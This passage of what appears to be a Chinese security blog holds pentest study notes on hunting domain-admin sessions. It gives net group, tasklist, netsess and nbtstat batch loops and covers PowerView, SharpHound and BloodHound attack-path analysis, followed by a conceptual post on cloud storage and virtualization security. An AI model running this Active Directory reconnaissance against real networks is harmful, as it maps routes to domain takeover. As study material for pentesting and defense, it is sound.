/domain 查询本机的所有进程和进程用户1tasklist /v 寻找进程所有者为域管理员的进程由前面的操作看到，并没有找到域管理员Administrator的进程，而是看到了testuser的进程。有时候运气好这种方法确实可以找得到，但是很多时候实际情况并非如此。 查询域控制器的域用户会话原理是在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理会话的系统列表。 查询域控制器列表可以使用LDAP查询从Domain Controllers单元中收集的域控制器列表，也可以使用net命令查询域控制器列表。 1net group \"Domain Controllers\" /domain 收集域管理员列表可以使用LDAP查询，也可以使用net命令查询，从域管理员组中收集域管理员列表。 1net group \"Domain Admins\" /domain 收集所有活动域的会话列表使用NetSess.exe工具查询每个域控制器，收集所有活动域会话列表。NetSess.exe包含本地Windows函数netsessionenum，该函数用于返回活动会话的IP地址、域账户、会话开始时间和空闲时间。 交叉引用域管理员列表和活动会话列表对域管理员列表和活动会话列表进行交叉引用，可以确定哪些IP地址有活动域令牌。也可以通过下面的脚本快速使用NetSess.exe的Windows命令行。 将域控制器列表添加到controllers.txt中，将域管理员列表添加到admins.txt中，并与NetSess.exe放在同一目录下。 运行脚本，会在当前目录下生成一个文本文件sessions.txt： 1FOR /F %i in (controllers.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) do @type sessions.txt | @findstr /I %a 当然，还有其他类似的脚本可以使用，比如Get Domain Admins（GDA）批处理脚本，可以自动完成整个过程 GDA下载地址：https://github.com/nullbind/Other-Projects/tree/master/GDA 查询远程系统中运行的任务如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下面的脚本来查询系统中的域管理任务。 首先，从Domain Admins组中收集域管理员列表，跟前面的一样： 1net group \"Domain Admins\" /domain 然后，运行如下脚本，将目标域系统列表添加到ips.txt中，将收集的域管理员列表添加到admins.txt中： 1FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause 扫描远程系统的NetBIOS信息某些版本的Windows允许用户通过NetBIOS来查询已登录的用户。 如下脚本可以扫描远程系统活动域中的管理会话，其中并未看到存在已登录的用户： 1for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i 也可以使用nbtscan工具，下载地址：https://github.com/lifenjoiner/nbtscan 脚本如下，运行后并没有看到存在已登录的用户： 1for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtscan -f %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i 0x03 域管理员模拟方法在内网渗透中，如果已经拥有一个meterpreter会话，那么就可以使用Incognito来模拟域管理员或者添加一个域管理员，通过尝试遍历系统中所有可用的授权令牌来添加新的管理员。 具体的后面的文章再细说。 0x04 利用PowerShell收集域信息PowerShell在之前的文章已经介绍过，这里主要介绍PowerView。 PowerView是一款依赖于PowerShell和WMI对内网进行查询的渗透测试脚本，集成在PowerSploit工具包中，在前面第一节中已经介绍过。 下载地址：https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 PowerView常用命令如下： Get-NetDomain：获取当前用户所在域的名称； Get-NetUser：获取所有用户信息； Get-NetDomainController：获取所有域控制器信息； Get-NetComputer：获取域内所有机器的详细信息； Get-NetOU：获取域中OU信息； Get-NetGroup：获取所有域内组合组成员信息； Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息； Get-NetShare：获取当前域内所有的网络共享信息； Get-NetSession：获取指定服务器的会话； Get-NetRDPSession：获取指定服务器的远程连接； Get-NetProcess：获取远程主机的进程； Get-UserProcess：获取指定用户的日志； Get-ADObject：获取活动目录的对象； Get-NetGPO：获取域内所有的组策略对象； Get-DomainPolicy：获取域默认策略或域控制器策略； Invoke-UserHunter：获取域用户登录的计算机信息和该用户是否有本地管理员权限； Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户； Invoke-UserEventHunter：根据用户日志查询某域用户登录过哪些域机器； 使用的时候只需要先进入PowerSploit的Recon目录中，然后输入命令Import-Module .\\PowerView.ps1导入脚本即可。 示例： 0x05 域分析工具BloodHoundBloodHound是一款免费的域分析工具，其使用可视化图来显示Active Directory环境中隐藏的和相关联的主机内容。攻击者可以使用BloodHound轻松识别高度复杂的攻击路径，否则很难快速识别。防御者可以使用BloodHound来识别和防御那些相同的攻击路径。蓝队和红队都可以使用BloodHound轻松深入了解Active Directory环境中的权限关系。 工具地址：https://github.com/BloodHoundAD/BloodHound 相关环境安装BloodHound依赖于JDK和Neo4j环境。 JDK不多说。 Neo4j是一个世界领先的开源图形数据库。 它是由Neo技术使用Java语言完全开发的。 官方下载地址：https://neo4j.com/download-center/#community 下载zip并解压后，进入bin目录中，输入neo4j.bat console命令来启动Neo4j服务，然后浏览器访问http://127.0.0.1:7474/browser，其中账号密码均为neo4j，然后就提示修改密码，这里本地修改为123456。 依赖环境搭建好之后，就开始下载BloodHound了，GitHub上Release地址直接下载即可：https://github.com/BloodHoundAD/BloodHound/releases 下载完解压之后，运行BloodHound.exe即可运行进入登录界面，这里输入Neo4j服务的账号密码即可： 界面简介登录进入BloodHound界面后，如下图： 界面左上角是菜单按钮和搜索栏，菜单中的三个选项卡分别为： 数据块信息（Database Info）：显示了所分析域的用户数量、计算机数量、组数量、会话数量、ACL数量、关系等信息，用户可以在此执行基本的数据库管理操作，包括注销和切换数据库，以及清除当前加载的数据库； 节点信息（Node Info）：显示了用户在图表中单击的某个节点的信息； 查询（Queries）：显示了BloodHound预置的查询请求和用户自己构建的查询请求； 界面右上角是设置区，分别为： 刷新功能：重新计算并绘制当前显示的图形； 导出图形功能：可将当前绘制的图形导出为JSON或PNG文件； 导入图形功能：可导入JSON文件； 上传数据功能：对上传的文件进行自动检测，然后获取CSV格式的数据； 更改布局类型功能：用于在分层和强制定向图布局之间切换； 设置功能：可以更改节点的折叠行为，以及在不同的细节模式之间切换； 关于：显示BloodHound相关的信息； 采集数据在使用BloodHound分析时，需要调用来自AD的三条信息： 哪些用户登录了哪些机器； 哪些用户拥有管理员权限； 哪些用户和组属于哪些组； 在大多数情况下，收集这三条信息不需要系统管理员权限。BloodHound是依赖于PowerView.ps1脚本的BloodHound来收集的。 BloodHound分为两部分： PowerShell采集器脚本（有两个版本，旧版本叫BloodHound_Old.ps1，新版本叫SharpHound.ps1）； 可执行文件SharpHound.exe； 目前最新版相关BloodHound采集器SharpHound地址：https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors 下载后，将SharpHound.exe复制到目标系统中，运行如下命令来提取域内信息： 1SharpHound.exe -c all 导入数据前面的命令执行完之后，会在当前目录下生成一个zip文件，如上图。 BloodHound支持通过界面上传单个文件和ZIP文件。 将刚刚生成的文件上传后，即可查看内网的相关信息： 可以看到，数据库中有4个用户、3台计算机、51个组、408条ACL、453个关系。 查询信息进入查询模块，可看到预定义了12个常用的查询条件： Find all Domain Admins：查找所有域管理员； Find Shortest Paths to Domain Admins：查找到达域管理员的最短路径； Find Principals with DCSync Rights：查找具有DCSync权限的主体； Users with Foreign Domain Group Membership：具有外部域组成员身份的用户； Groups with Foreign Domain Group Membership：具有外部域组成员身份的组； Map Domain Trusts：映射域信任； Shortest Paths to Unconstrained Delegation Systems：无约束委托系统的最短路径； Shortest Paths from Kerberoastable Users：Kerberoastable用户的最短路径； Shortest Paths to Domain Admins from Kerberoastable Users：从Kerberoastable用户到域管理员的最短路径； Shortest Path from Owned Principals：拥有主体的最短路径； Shortest Paths to Domain Admins from Owned Principals：从所属主体到域管理员的最短路径； Shortest Paths to High Value Targets：高价值目标的最短路径； 查找所有域管理员BloodHound可以帮助使用者找出当前域中存在多少个域管理员。 点击”Find all Domain Admins”，如下： 可以看到，当前域中有1个具有域管理员权限的用户即Administrator。按”Ctrl”键将循环显示”默认阈值”、”始终显示”、”从不现实”三个选项，以显示不同的节点标签。也可以选中某个节点，在其图标上按住鼠标左键，将节点移动到其他位置。 本地域环境比较简单，看下书上的，显示的是有15个具有域管理员权限的用户： 查找到达域管理员的最短路径点击”Find Shortest Paths to Domain Admins”，如下： 可以看到，由于本地域环境比较简单，所以只有一条最短路径。 为了更好掌握如何使用这个工具，下面看下书上的例子： 这里BloodHound列出来3条可以到达域管理员的路径。具体说明如下： 最上边的节点即图标右下方有个类似于“瞄准目标”的图案为目标域管理员组。该组是本次内网渗透的核心目标，既是图中的一个节点也是所有路径的尽头。 左边这条路径上的三个用户属于第一个节点组，而第一个节点组在第二个节点组内。第二个节点组对其上面的第三个节点的用户具有权限，且该用户是上一台计算机（第四个节点）的本地管理员，可以在这台计算机上拿到上一个（第五个节点）用户的会话。第五个节点的用户属于Domain Admins组，可以通过哈希传递的方法获取域管理员和域控制器权限。第三个节点分支中的用户，可以对处于第三个节点的用户强制推送策略，直接修改第三个节点中的用户的密码，然后通过哈希传递的方法获取第四个节点的权限，依次类推。 中间这条路径，第一个节点中的三个用户为域管理员委派服务账号，可以对该域的域控制器进行DCSync同步，将第二个节点的用户（属于Domain Admins组）的散列值同步过来。 右边这条路径，第一个节点的用户是第二个节点计算机的本地管理员（在该计算机中可以获取第三个节点的用户散列值），第三个节点用户属于第四个节点组，第四个节点组是第五个节点计算机的本地管理员组（在该计算机上可以获取第五个节点用户的散列值，该用户属于Domain Admins组）。 查看指定用户与域关联的详细信息 单击某个节点，BloodHound将使用该节点的相关信息来填充Node Info选项卡。 比如本地环境中点击用户节点testuser，即可在Node Info中查看到该用户与域相关的详细信息，以便于后续在域中进行横向渗透： 查看指定计算机与域的关系点击任意计算机，可以看到该计算机在域内的名称、系统版本、是否启用、是否允许无约束委托等信息。 比如查看本地环境的Win7计算机与域相关的详细信息： 寻找路径寻找路径的操作和导航软件的操作类似，单击路径图标，会弹出目标节点文本框，输入起始节点和目标节点，然后点击运行，如果存在此类路径，BloodHound会找到所有从开始节点到目标节点的路径，并在图形绘制区域将这些路径显示出来： 0x06 内网敏感数据的防护内网中的核心敏感数据一般包括数据库、邮件、个人数据及组织的业务数据、技术数据等。 要有效地进行内网数据的安全防护，需要掌握攻击者的操作流程。 内网敏感数据的定位流程内网敏感数据防护的第一步，就是要熟悉攻击者获取数据的流程。 在实际的内网环境中，攻击者主要通过各种恶意方法来定位公司内部人员的机器，从而获取内网敏感数据。其定位的大致流程如下： 定位内部人事组织结构； 在内部人事组织结构中寻找需要监视的人员； 定位相关人员的机器； 监视相关人员存放文档的位置； 列出存放文档的服务器的目录； 重点核心业务机器及敏感信息防护对于重点核心业务机器应当采取相应的安全防护措施来保障敏感数据的安全。 核心业务机器 高级管理人员、系统管理员、财务/人事/业务人员的个人计算机； 产品管理系统服务器； 办公系统服务器； 财务应用系统服务器； 核心产品源码服务器（自建的SVN或GIT服务器）； 数据库服务器； 文件服务器、共享服务器； 电子邮件服务器； 网络监控系统服务器； 其他服务器（分公司等）； 敏感信息和敏感文件 站点源码备份文件、数据库备份文件等； 各类数据库的Web管理入口，比如phpmyadmin、Adminer等； 浏览器密码和浏览器Cookie； 其他用户会话、3389和ipc$连接记录、回收站中的信息等； Windows无线密码； 网络内部的各种账号密码，包括电子邮箱、VPN、FTP、TeamView等； 应用和文件形式信息的防护在内网中，攻击者一般会进行基于应用和文件的信息收集，包括一些应用的配置文件、敏感文件、密码、远程连接、员工账号、电子邮箱等。从总体来看，攻击者一是要了解已攻陷的机器所属人员的职位，二是要在机器中使用一些搜索命令来寻找自己需要的资料。 针对攻击者的此类行为，建议用户在内网中工作时，不要将特别重要的资料存储在公开的计算机中，在必要时需要对Office文件进行加密且密码不能为弱密码。 0x07 分析域内网段划分情况及拓扑结构在掌握了内网的相关信息之后，攻击者可以分析目标网络的结构和安全防御策略，获取网段信息、各部门的IP地址段，并尝试绘制内网的拓扑结构图。 基本架构攻击者需要对目标网站的基本情况进行简单的判断，分析目标服务器所使用的的Web服务器、后端语言、数据库、系统平台等。 下面是一些常见的Web架构： ASP + Access + IIS 5.0/6.0 + Windows Server 2003 ASPX + MySQL + IIS 7.0/7.5 + Windows Server 2008 PHP + MySQL + IIS PHP + MySQL + Apache PHP + MySQL + Nginx JSP + MySQL + Nginx JSP + MSSQL + Tomcat JSP + Oracle + Tomcat 域内的网段划分掌握整个内网的网络分布和构成情况有助于攻击者了解内网的核心业务。 在判断内网环境时，先要分析内网IP地址的分布情况。一般可以通过内网中的路由器、交换机等设备以及SNMP、弱口令等，来获取内网网络拓扑或者DNS域传送的信息。而大型公司一般都有内部网站，也可以通过内部网站的公开链接来分析IP地址分布情况。 内网的网段一般是划分为DMZ、办公区和和核心区（生产区）。 DMZ一般的外网渗透测试中，攻击者拿到的Web权限都是在DMZ中的。DMZ区域严格来说并不属于内网。如果访问控制处理配置合理，DMZ就会处在从内网能够访问DMZ但从DMZ无法访问内网的状态。 办公区即企业员工的工作区。办公区的安全防护水平通常不搞，基本的防护机制大多为杀软或主机入侵检测产品。 在实际的网络环境中，攻击者在获取办公区的权限后，会利用内网信任关系来扩大供给面。不过在一般情况下，攻击者很少能直接到达办公区，通常可能会使用鱼叉攻击、水坑攻击或社工等手段来进入办公区。 办公区按照系统可分为OA系统、邮件系统、财务系统、文件共享系统、企业版杀毒系统、内部应用监控系统、运维管理系统等，按照网段可分为域管理网段、内部服务器系统网段、各部门分区网段等。 核心区核心区内一般存放着企业最重要的数据、文档等信息资产，比如域控制器、核心生产机器等，安全设置也最为严格。根据业务的不同，相关服务器可能存在于不同的网段中。 在实际的网络环境中，攻击者通过分析服务器上运行的服务和进程就可以推断出目标主机使用的运维监控管理系统和安全防护系统。 核心区按照系统可分为业务系统、运维监控系统、安全系统等，按照网段可分为业务网段、运维监控网段、安全管理网段等。 多层域结构在大型企业中，其内网大都采用多层域结构甚至多级域结构，因此在进行内网渗透测需要先判断当前内网中是否存在多层域、当前计算机所在的域是几级子域、该子域的域控制器及根域的域控制器是哪些、其他域的域控制器是哪些、不同的域之间是否存在域信任关系等。 绘制内网拓扑图通过目标主机机器所在域的各类信息可以绘制内网拓扑图了，以便于后续的内网渗透、利于快速定位内网目标。 比如网上找的一个内网拓扑图：","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.mi1k7ea.com/tags/内网渗透/"}]},{"title":"云存储安全基础一","date":"2020-12-06T03:07:37.000Z","path":"2020/12/06/云存储安全基础/","text":"0x00 前言总结笔记：《云存储安全 大数据分析与计算的基石》 0x01 云存储基本概念简介云存储是一种网上在线存储（英语：Cloud storage）的模式，即把数据存放在通常由第三方托管的多台虚拟服务器，而非专属的服务器上。托管（hosting）公司运营大型的数据中心，需要数据存储托管的人，则透过向其购买或租赁存储空间的方式，来满足数据存储的需求。数据中心营运商根据客户的需求，在后端准备存储虚拟化的资源，并将其以存储资源池（storage pool）的方式提供，客户便可自行使用此存储资源池来存放文件或对象。实际上，这些资源可能被分布在众多的服务器主机上。 云存储这项服务乃透过Web服务应用程序接口（API）, 或是透过Web化的用户界面来访问。 工作原理云存储是在云计算(cloud computing)概念上延伸和衍生发展出来的一个新的概念。云计算是分布式处理(Distributed Computing)、并行处理(Parallel Computing)和网格计算(Grid Computing)的发展，是透过网络将庞大的计算处理程序自动分拆成无数个较小的子程序，再交由多部服务器所组成的庞大系统经计算分析之后将处理结果回传给用户。通过云计算技术，网络服务提供者可以在数秒之内，处理数以千万计甚至亿计的信息，达到和”超级计算机”同样强大的网络服务。 云存储的概念与云计算类似，它是指通过集群应用、网格技术或分布式文件系统等功能，网络中大量各种不同类型的存储设备通过应用软件集合起来协同工作，共同对外提供数据存储和业务访问功能的一个系统，保证数据的安全性，并节约存储空间。简单来说，云存储就是将储存资源放到云上供人存取的一种新兴方案。使用者可以在任何时间、任何地方，透过任何可连网的装置连接到云上方便地存取数据。如果这样解释还是难以理解，那我们可以借用广域网和互联网的结构来解释云存储。 优点云存储有如下几个优点： 存储管理可以实现自动化和智能化，所有的存储资源被整合到一起，客户看到的是单一存储空间; 提高了存储效率，通过虚拟化技术解决了存储空间的浪费，可以自动重新分配数据，提高了存储空间的利用率，同时具备负载均衡、故障冗余功能; 云存储能够实现规模效应和弹性扩展，降低运营成本，避免资源浪费; 发展趋势 大数据的发展需要云计算和云存储； AI的发展需要云计算和云存储； IoT的发展需要云计算和云存储； 分类云存储可分为以下三类： 公共云存储像亚马逊公司的Simple Storage Service(S3)和Nutanix公司提供的存储服务一样，它们可以低成本提供大量的文件存储。供应商可以保持每个客户的存储、应用都是独立的，私有的。其中以Dropbox为代表的个人云存储服务是公共云存储发展较为突出的代表，国内比较突出的代表的有搜狐企业网盘，百度云盘，乐视云盘，移动彩云，金山快盘，坚果云，酷盘，115网盘，华为网盘，360云盘，新浪微盘，腾讯微云,cStor云存储等。 公共云存储可以划出一部分用作私有云存储。一个公司可以拥有或控制基础架构，以及应用的部署，私有云存储可以部署在企业数据中心或相同地点的设施上。私有云可以由公司自己的IT部门管理，也可以由服务供应商管理。 内部云存储这种云存储和私有云存储比较类似，唯一的不同点是它仍然位于企业防火墙内部。至2014年可以提供私有云的平台有：Eucalyptus、3A Cloud、minicloud安全办公私有云、联想网盘等。 混合云存储这种云存储把公共云和私有云/内部云结合在一起。主要用于按客户要求的访问，特别是需要临时配置容量的时候。从公共云上划出一部分容量配置一种私有或内部云可以帮助公司面对迅速增长的负载波动或高峰时很有帮助。尽管如此，混合云存储带来了跨公共云和私有云分配应用的复杂性。 常见云存储应用场景常见的云存储系统应用场景如图： 数据拥有者将数据存放到存储云上，可以通过服务提供商提供的访问方式来访问数据，同时也在访问控制的限制下允许数据拥有者将一些数据共享给其他用户。 云存储安全出现安全问题的原因 云存储的租用商业模式：云存储场景中，存储资源由服务提供者控制，并且通过虚拟化的方式将存储资源同事租给多个用户使用。此时用户是失去了对数据的直接控制权，云存储安全除了防范外部攻击者之外、还需要防止内部出现如敏感数据泄露给其他用户等的安全问题； 虚拟化技术的应用：虚拟化技术是云计算和云存储的基础技术，是资源能够动态伸缩并得到充分利用的关键。而虚拟化本身的安全问题就给云存储带来了新的安全风险； 多租户共享：多租用共享一直是云架构的一大安全隐患。即使有访问控制等措施来进行限制，但是恶意租户可以利用系统漏洞或旁路工具来获取租户数据； 云计算的安全悖论：很多用户会选择公共云计算和云存储来为自己提供较好的安全保障，但是这却引入了公共云的安全风险进来； 安全威胁业内细分的12大云存储安全威胁如下： 数据泄露 身份、凭证和访问控制不当 不安全的访问接口和API 系统漏洞 账户劫持 内部威胁 APT攻击 数据丢失 对拟采用的服务调研不足 滥用云服务 DoS 共享架构中的技术漏洞 从另一个维度看的话，云存储的安全威胁主要包括外部威胁和内部威胁两个方面。其中外部威胁能通过技术手段去解决，内部威胁则更难防范、包括恶意内部员工、操作失误、云基础框架配置不当、远程管理风险等等。 数据生命周期中的安全风险云存储安全的根源就是用户数据的安全。 云存储中的数据生命周期是指，用户将数据保存到云存储服务器中，从数据产生、数据存储、数据利用、数据共享、数据迁移到数据销毁的整个过程。而这各个过程都面临着不同的安全风险： 数据产生：本阶段由数据拥有者产生数据但还未存储到云服务器，默认是安全的。为保障后续的数据安全，需要进行如数据加密、建立索引、生成完整性验证标签、微数据添加属性等一些预处理； 数据存储：用户将数据存储到云服务器时存在以下安全风险： 用户失去对数据的物理控制权； 数据存储在云服务器上，可能存在恶意内部人员威胁、云服务器被入侵攻破的情况，导致数据存在丢失和篡改的风险； 云服务器可能会受到自然灾害等因素的破坏； 数据利用：数据利用是指用户存储数据后对数据的增删改查等操作。本阶段存在以下安全风险： 非法访问：比如云服务提供商的访问控制和授权机制存在缺陷，导致存在非法访问的问题； 数据传输安全：用户通过网络来远程访问数据，在数据传输过程中可能被攻击者嗅探、篡改数据； 服务质量（QoS）保证：满足用户对网络访问数据相关服务质量的要求； 数据共享：数据共享是指用户将其存储在云服务器上的数据与第三方共享。在数据共享的过程中，重点在于数据访问控制和授权，即与第三方共享数据的时候可能存在的非法访问风险。 数据迁移：数据迁移是指将很少使用或不适用的数据迁移到一个单独的存储设备进行长期保存的存档过程。在数据迁移过程中需要注入平滑过渡、出错处理、数据迁移测试等问题。除了和前面存储类似的安全风险外，还存在如下安全风险： 可用性问题； 合规性问题； 数据销毁：通常，计算机删除数据并没有将数据从计算机的硬盘上真正地删除，只是删除了文件相应的索引使得用户不能通过文件系统来访问该文件。而对硬盘进行格式化也并没有将磁盘上的数据删除，只是重新创建文件系统并创建新的索引，将磁盘的扇区标记为未使用过。因此，被删除的数据存在被还原的风险。同时，对于拥有用户数据物理控制权的云服务提供商不一定是可信的。 多维度的安全保障实现 云存储安全体系结构 云存储虚拟化安全 云存储系统访问控制 云存储数据机密性保障 云存储数据完整性保障 云存储数据备份与恢复 云存储入侵检测 云存储应用一个最佳安全实践 仍面临的挑战 数据的可信删除； 数据外包模式下的内部威胁； 数据迁移风险； 加密数据的处理； 0x02 云存储安全体系结构云存储系统结构相比于传统的存储系统，云存储系统不仅包括硬件，还包括由存储设备、计算设备、网络设备、服务器、应用软件、公共访问接口和客户端程序等多个部分组成的复杂系统。各部分以存储设备为核心，通过应用软件来对外提供数据存储和业务访问功能。 云存储系统结构如图： 物理资源层：云存储最基础的部分，由各种物理设备组成的一个集存储、计算、网络和数据库于一体的物力资源仓库； 虚拟化层：对存储、计算和网络设备进行逻辑虚拟化，将各类资源划分为统一规格的存储、计算和网络单元，构成对应的资源池来分配给用户； 基础管理层：云存储最核心的部分，通过集群系统、分布式文件系统和网格计算等技术，实现云存储中多个存储设备之间的协同工作，对外提供良好的数据访问性能； 应用接口层：包括公用API接口、应用软件、Web服务、网络接入等； 访问层：利用云存储服务提供商访问层所提供的不同访问类型和访问方式，用户可通过多种方式来访问云存储服务； 云存储系统安全体系结构云存储系统结构的每一层都存在前面说到的一些安全威胁，因此针对每一层都需要不同的安全措施来进行应对。 当前的云存储系统安全体系结构如图： 其实就是在云存储系统结构的不同层上加上对应的安全措施来保障整个云存储系统架构的安全性。 具体每一层的安全措施后面会说到。 保障云存储安全的几个原则书籍中总结了设计安全云存储系统时需要遵循的一些安全原则： 合理的安全假设：假设除自己以外的所有实体都是不可信的，以此来采用对应的安全应对措施； 整体性原则：根据云存储系统安全体系结构，制定全生命周期的安全方案，保证整体安全无短板； 数据的合规性：熟悉当地安全标准和法规，避免合规问题的产生； 充分了解云存储服务提供商：包括服务提供商的信誉、服务质量、安全机制等等； 避免厂商锁定：对于重要数据可以考虑建立混合云框架，结合多云存储，避免单服务提供商可能造成的厂商锁定； 纵深防御：多方面、多层次进行安全防御； 长远的考虑：如业务连续性、灾难恢复、长期利润率等等； 0x03 云存储虚拟化安全虚拟化技术虚拟化技术是云计算和云存储的重要技术，主要用于物理资源的池化，从而可以弹性地分配给用户。物理资源包括服务器、网络和存储。 目前广泛使用的虚拟化架构主要根据是否修改客户操作系统分为全虚拟化和半虚拟化。 全虚拟化：无需修改操作系统，透明性和兼容性较好，但性能开销较大。其中，VMM直接运行在物理硬件上，通过提供指令集和设备接口来提供对上层虚拟机的支持； 半虚拟化：需要修改操作系统，一般用于开源操作系统，可实现接近物理机的性能。其中，VMM作为一个应用程序运行在客户操作系统上，利用客户操作系统的功能实现硬件资源的抽象和上层虚拟机的管理； VMMVMM一般指虚拟机监视器。监控系统行为是虚拟机系统的核心任务，监控系统可用于调度任务、负载均衡、向管理员报告软硬件故障，并广泛控制系统的使用情况。 虚拟化技术分类虚拟化技术可按照虚拟资源的类型来分类，如下。 存储虚拟化存储虚拟化(Storage Virtualization)最通俗的理解就是对存储硬件资源进行抽象化表现。通过将一个或多个目标服务或功能与其它附加的功能集成，统一提供有用的全面功能服务。典型的虚拟化包括如下一些情况：屏蔽系统的复杂性，增加或集成新的功能，仿真、整合或分解现有的服务功能等。虚拟化是作用在一个或者多个实体上的，而这些实体则是用来提供存储资源或/及服务的。 存储虚拟化是一种贯穿于整个IT环境、用于简化本来可能会相对复杂的底层基础架构的技术。存储虚拟化的思想是将资源的逻辑映像与物理存储分开，从而为系统和管理员提供一幅简化、无缝的资源虚拟视图。 对于用户来说，虚拟化的存储资源就像是一个巨大的“存储池”，用户不会看到具体的磁盘、磁带，也不必关心自己的数据经过哪一条路径通往哪一个具体的存储设备。 存储虚拟化有如下三种方法： 基于主机的存储虚拟化：采用基于软件的方式实现资源的管理，实现简单、设备成本低，但占用主机资源、扩展性较差； 基于存储设备的存储虚拟化：通过设备自身的功能模块实现虚拟化，易于配置和管理，但在异构的网络存储环境下管理成本较高； 基于网络的存储虚拟化：基于网络的虚拟化方法是在网络设备之间实现存储虚拟化功能，具体有下面几种方式： 基于互联设备的虚拟化； 基于路由器的虚拟化； 网络虚拟化网络虚拟化是指对网络设备进行虚拟化，即对传统的路由器、交换机等网络设备进行扩展，在一个物理网络上模拟出多个相互隔离的逻辑网络（一对一、多对一、一对多），使得不同用户使用独立的网络资源时间片，从而提高网络资源利用效率，实现弹性的网络。网络虚拟化可以帮助保护 IT 环境，防止来自 Internet 的威胁，同时使用户能够快速安全的访问应用程序和数据。 网络虚拟化采用基于软件的方式，从物理网络元素中分离网络流量。通常分为虚拟局域网和虚拟专用网。 虚拟局域网可以将一个物理局域网划分成多个虚拟局域网，或者将多个物理局域网划分成一个虚拟局域网，使得虚拟局域网中的通信类似于物理局域网并对用户透明。 虚拟专用网（VPN）对网络连接进行了抽象，允许远程用户访问组织的内部网络，就像物理上连接到该网络一样。 服务器虚拟化服务器虚拟化技术是将服务器物理资源抽象成逻辑资源，让一台服务器变成几台甚至上百台相互隔离的虚拟服务器（一对多、多对一、多对多），我们不再受限于物理上的界限，而是让CPU、内存、磁盘、I/0等硬件变成可以动态管理的“资源池”，从而提高资源的利用率，简化系统管理，实现服务器资源整合，让IT对业务的变化更具适应力。 常见的服务器虚拟化平台有VMware的vSphere、Microsoft的Hyper-V、剑桥大学的Xen、Qumranet的KVM等。 服务器虚拟化结构如图： 桌面虚拟化桌面虚拟化是指将计算机的终端系统（也称作桌面）进行虚拟化，以达到桌面使用的安全性和灵活性。可以通过任何设备，在任何地点，任何时间通过网络访问属于我们个人的桌面系统。 应用虚拟化应用虚拟化是将应用程序与操作系统解耦合，为应用程序提供了一个虚拟的运行环境。在这个环境中，不仅包括应用程序的可执行文件，还包括它所需要的运行时环境。从本质上说，应用虚拟化是把应用对低层的系统和硬件的依赖抽象出来，可以解决版本不兼容的问题。 技术原理是基于应用/服务器计算A/S架构，采用类似虚拟终端的技术，把应用程序的人机交互逻辑（应用程序界面、键盘及鼠标的操作、音频输入输出、读卡器、打印输出等）与计算逻辑隔离开来。在用户访问一个服务器虚拟化后的应用时，用户计算机只需要把人机交互逻辑传送到服务器端，服务器端为用户开设独立的会话空间，应用程序的计算逻辑在这个会话空间中运行，把变化后的人机交互逻辑传送给客户端，并且在客户端相应设备展示出来，从而使用户获得如同运行本地应用程序一样的访问感受。 虚拟化漏洞类型虚拟机跳跃虚拟机跳跃（VM Hopping）是指攻击者利用一台虚拟机通过某种方式获取同一个VMM上其他虚拟机的访问权限。这种类型漏洞的根源在于虚拟机的物理资源被多租户共享。 虚拟机逃逸虚拟机逃逸（VM Escape）是指利用虚拟机软件或者虚拟机中运行的软件的漏洞进行攻击，以达到攻击或控制虚拟机宿主操作系统的目的，是最常见和经典的虚拟化漏洞类型。 正常情况下，同一虚拟化平台下的虚拟机之间是彼此隔离、不能相互影响的。但如果因为虚拟化漏洞的存在或隔离方式的不正确就会导致隔离失效，使得非特权虚拟机获得Hypervisor的访问权限，并入侵同一宿主机上的其他虚拟机，这就是虚拟机逃逸。 与虚拟机跳跃相比，虚拟机逃逸不同之处在于需要对Hypervisor发起攻击利用，包括获取访问权限、入侵和破坏等。 远程管理缺陷一般的，虚拟化平台管理员会使用远程管理平台通过Hypervisor提供的接口对虚拟机进行管理，如VMware的vCenter、XenServer的XenCenter等，这样的集中管理降低了管理复杂度，但是会带来远程管理平台这一层面带来的Web安全风险，如XSS、SQL注入、命令注入等。 DoS同一物理机上的虚拟机共享资源，如果攻击者利用一台虚拟机获得宿主机的所有资源，就会导致其他虚拟机没有资源可用，从而造成虚拟化环境下的DoS攻击。 虚拟机迁移攻击虚拟机迁移时，需要先迁移虚拟机的内存等状态信息，并传输虚拟机副本到新的物理机上恢复运行，此时攻击者有较多的时间获取敏感信息，而且若被迁移的虚拟机存在安全漏洞，迁移到的物理机安全性不高，就容易遭受攻击。 虚拟机监视器攻击虚拟机监视器是虚拟化平台的核心，如果攻击者找到虚拟机监视器的漏洞就会导致整个虚拟化平台的沦陷。 VMM具有最高权限和较小的可信计算基，从而为虚拟化系统提供安全监控和保护，但是同时也引入了VMM本身的新的软件层所带来的新的安全风险。 虚拟机攻击方法前面是说的虚拟化漏洞类型，具体的攻击方法主要如下。 窃取服务攻击云环境一般采用多种弹性计费模式，根据CPU、虚拟机的运行时间、存储空间的大小、网络流量等来计算费用。但是这种计费模式的周期性采样和低精度的时钟调度策略使得攻击者可以利用虚拟层调度机制的漏洞，使系统管理程序错误地检测CPU、虚拟机的运行时间等，实现窃取服务攻击。常规的虚拟机调度机制没有对调度的正确性进行检查，使得攻击者可以以隐蔽的方式占用他人的云服务资源。 